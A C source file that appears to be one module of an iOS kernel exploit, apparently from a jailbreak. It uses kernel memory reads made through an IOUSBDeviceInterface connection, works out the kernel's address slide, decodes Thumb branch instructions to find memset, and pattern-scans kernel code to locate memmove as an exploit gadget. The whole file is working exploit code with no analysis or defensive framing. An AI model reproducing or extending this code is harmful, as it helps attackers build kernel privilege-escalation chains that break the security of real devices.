#include <syslog.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "exploit.h"
#include "findmemmove.h"

///////////////////////////////////////            Find Memmove            ///////////////////////////////////////

static int insn_is_32bit(uint16_t* i)
{
    return (*i & 0xe000) == 0xe000 && (*i & 0x1800) != 0x0;
}

static int insn_is_bl(uint16_t* i)
{
    if((*i & 0xf800) == 0xf000 && (*(i + 1) & 0xd000) == 0xd000)
        return 1;
    else if((*i & 0xf800) == 0xf000 && (*(i + 1) & 0xd001) == 0xc000)
        return 1;
    else
        return 0;
}

static uint32_t insn_bl_imm32(uint16_t* i)
{
    uint16_t insn0 = *i;
    uint16_t insn1 = *(i + 1);
    uint32_t s = (insn0 >> 10) & 1;
    uint32_t j1 = (insn1 >> 13) & 1;
    uint32_t j2 = (insn1 >> 11) & 1;
    uint32_t i1 = ~(j1 ^ s) & 1;
    uint32_t i2 = ~(j2 ^ s) & 1;
    uint32_t imm10 = insn0 & 0x3ff;
    uint32_t imm11 = insn1 & 0x7ff;
    uint32_t imm32 = (imm11 << 1) | (imm10 << 12) | (i2 << 22) | (i1 << 23) | (s ? 0xff000000 : 0);
    return imm32;
}

static uint16_t* find_next_insn_matching(uint32_t region, uint8_t* kdata, size_t ksize, uint16_t* current_instruction, int (*match_func)(uint16_t*))
{
    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))
    {
        if(insn_is_32bit(current_instruction))
        {
            current_instruction += 2;
        } else
        {
            ++current_instruction;
        }

        if(match_func(current_instruction))
        {
            return current_instruction;
        }
    }

    return NULL;
}

static uint32_t find_memmove_arm(uint32_t region, uint8_t* kdata, size_t ksize)
{
    const uint8_t search[] = {0x00, 0x00, 0x52, 0xE3, 0x01, 0x00, 0x50, 0x11, 0x1E, 0xFF, 0x2F, 0x01, 0xB1, 0x40, 0x2D, 0xE9};
    void* ptr = memmem(kdata, ksize, search, sizeof(search));
    if(!ptr)
        return 0;

    return ((uintptr_t)ptr) - ((uintptr_t)kdata);
}

static uint32_t find_memmove_thumb(uint32_t region, uint8_t* kdata, size_t ksize)
{
    const uint8_t search[] = {0x03, 0x46, 0x08, 0x46, 0x19, 0x46, 0x80, 0xB5};
    void* ptr = memmem(kdata, ksize, search, sizeof(search));
    if(!ptr)
        return 0;

    return ((uintptr_t)ptr + 6 + 1) - ((uintptr_t)kdata);
}

// Helper gadget.
static uint32_t find_memmove(uint32_t region, uint8_t* kdata, size_t ksize)
{
    uint32_t thumb = find_memmove_thumb(region, kdata, ksize);
    if(thumb)
        return thumb;

   return find_memmove_arm(region, kdata, ksize);
}

uint32_t get_memmove()
{
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOUSBDeviceInterface"));
    io_connect_t connect;
    IOServiceOpen(service, mach_task_self(), 0, &connect);

    uint32_t memmove = get_memmove2(connect);

    IOServiceClose(connect);

    return memmove;
}

uint32_t get_memmove2(io_connect_t connect)
{
    uint32_t kernel_region = get_kernel_region(connect);
    uint32_t kernel_text_start = kernel_region + get_kernel_text_start();

    // Dump the default_pager function to help us locate memmove.
    // The default_pager function seems to always be the very first function in the kernel text.
    uint8_t* default_pager = kernel_read_exception_vector(connect, kernel_text_start, 0x1000);

    // Find the second function call in this function, it will be memset.
    uint16_t* first_function_call = find_next_insn_matching(kernel_region, default_pager, 0x1000, (uint16_t*) default_pager, insn_is_bl);
    if(!first_function_call)
        return 0;

    uint16_t* second_function_call = find_next_insn_matching(kernel_region, default_pager, 0x1000, first_function_call, insn_is_bl);
    if(!second_function_call)
        return 0;

    uint32_t second_function_call_address = kernel_text_start + ((intptr_t)second_function_call - (intptr_t)default_pager);
    uint32_t imm32 = insn_bl_imm32(second_function_call);
    uint32_t memset = second_function_call_address + 4 + imm32;

    free(default_pager);

    uint32_t memmove_search_start = memset - 0x2000;
    uint8_t* memmove_search = kernel_read_exception_vector(connect, memmove_search_start, 0x2000);

    uint32_t memmove_offset = find_memmove(memmove_search_start, memmove_search, 0x2000);
    uint32_t memmove_address = memmove_search_start + memmove_offset;
    uint32_t memmove = memmove_address - kernel_region;

    free(memmove_search);

    return memmove;
}
